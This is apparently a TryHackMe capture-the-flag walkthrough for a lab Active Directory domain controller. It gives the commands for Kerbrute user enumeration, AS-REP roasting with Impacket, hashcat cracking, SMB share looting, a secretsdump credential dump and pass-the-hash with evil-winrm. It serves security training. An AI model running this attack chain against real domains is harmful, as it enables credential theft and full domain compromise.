# Attacktive Directory

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory01.png" width="150" height="150">

LINK = [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description
99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

# Steps

1: What tool will allow us to enumerate port 139/445?
* enum4linux

2: What is the NetBIOS-Domain Name of the machine?
* ```enum4linux -a <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory02.png" width="50%">

3: What invalid TLD do people commonly use for their Active Directory Domain?
* Read the documentation of the room

4: What command within Kerbrute will allow us to enumerate valid usernames?
* Download Kerbrute and give execution permissions
* ```wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64```
* ```chmod +x kerbrute_linux_amd64```
* ```./kerbrute_linux_amd64 --help```

5: What notable account is discovered? (These should jump out at you)
6: What is the other notable account is discovered? (These should jump out at you)
* Lets download wordlists:
* ```wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt```
* ```wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt```
* ```./kerbrute_linux_amd64 userenum --dc=<ip-virtual-machine> -d=<dns-domain-name> userlist.txt```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory03.png" width="50%">

7: We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
* Save the username of the Kerbrute output in a file call validusers.txt
* ```python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile validusers.txt -dc-ip <ip-virtual-machine> <dns-domain-name>/```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory04.png" width="50%">

8: Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
9: What mode is the hash?
* Search [HERE](https://hashcat.net/wiki/doku.php?id=example_hashes) the format of the hash you got from the Impacket output

10: Now crack the hash with the modified password list provided, what is the user accounts password?
* Save the hash found from the Impacket output in a file call hash.txt, use hashcat to crack the password
* ```hashcat -m18200 hash.txt passwordlist.txt```

11: What utility can we use to map remote SMB shares?
* smbclient

12: Which option will list shares?
* Read the documentation in ```smbclient -h```

13: How many remote shares is the server listing? 
* ```smbclient -L <ip-virtual-machine> -U "<user-from-impacket-output>"```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory05.png" width="50%">

14: There is one particular share that we have access to that contains a text file. Which share is it?
* Search in the output of ```smbclient -h```

15: What is the content of the file?
```
smbclient \\\\<ip-virtual-machine>\\backup -U "<user-from-impacket-output>"
smb: \> dir
smb: \> get <name-of-file>
smb: \> exit
```

17: Decoding the contents of the file, what is the full contents?
* ```cat <name-of-file> | base64 --decode```

18: What method allowed us to dump NTDS.DIT?
* Read the documentation in ```python3.9 /opt/impacket/examples/secretdump -h```

19) What is the Administrators NTLM hash?
* Use the tool secretsdump with the credentials obtained in the last task
* ```python3.9 /opt/impacket/examples/secretsdump.py <dns-domain-name>/<username>:<password>@<ip-virtual-machine>```

  <img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory06.png" width="50%">

20: What method of attack could allow us to authenticate as the user without the password?
* Search about how to login to a remote server with an user's hash

21: Using a tool called Evil-WinRM what option will allow us to use a hash?
* ```sudo gem install evil-winrm```
* Search in the output of ```evil-winrm -h```

22: Submit the flags for each user account
* Use the tool evil-winrm with the credentials we obtained using secretsdump
* ```evil-winrm -i <ip-virtual-machine> -u <user-from-secretdump-output> -H <hash-from-secretdump-output>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/attacktivedirectory/attacktivedirectory07.png" width="50%">  
  
* Browse to each user Desktop and find the flag files

23: Get the flags!! 😎
